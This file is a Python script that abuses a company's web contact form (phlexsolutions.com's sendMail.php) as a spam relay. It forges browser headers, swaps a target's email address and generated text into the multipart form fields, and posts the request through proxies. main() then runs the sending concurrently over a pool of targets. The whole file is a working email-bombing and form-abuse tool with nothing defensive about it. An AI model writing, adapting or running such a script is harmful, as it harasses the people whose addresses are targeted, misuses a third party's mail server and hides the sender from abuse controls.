from os.path import basename

import requests

from module import Spam

headers = {
    'authority': 'www.phlexsolutions.com',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryWzALbMdJTExlLDcu',
    'origin': 'https://www.phlexsolutions.com',
    'referer': 'https://www.phlexsolutions.com/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryWzALbMdJTExlLDcu\r\nContent-Disposition: form-data; name="full_name"\r\n\r\ntest\r\n' \
               '------WebKitFormBoundaryWzALbMdJTExlLDcu\r\nContent-Disposition: form-data; name="email"\r\n\r\nwezxasqw@gmail.com\r\n' \
               '------WebKitFormBoundaryWzALbMdJTExlLDcu\r\nContent-Disposition: form-data; name="phone"\r\n\r\ntest\r\n' \
               '------WebKitFormBoundaryWzALbMdJTExlLDcu\r\nContent-Disposition: form-data; name="company"\r\n\r\ntest\r\n' \
               '------WebKitFormBoundaryWzALbMdJTExlLDcu\r\nContent-Disposition: form-data; name="project_type"\r\n\r\nMaritime Logistics\r\n' \
               '------WebKitFormBoundaryWzALbMdJTExlLDcu\r\nContent-Disposition: form-data; name="message"\r\n\r\ntest\r\n------WebKitFormBoundaryWzALbMdJTExlLDcu--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        text = self.get_text(False)
        data = data.replace('test', text)
        response = requests.post('https://www.phlexsolutions.com/inc/sendMail.php', headers=headers, data=data.encode(),
                                 proxies=self.get_proxies())

        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'done', target_pool_name='fkasn23')
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
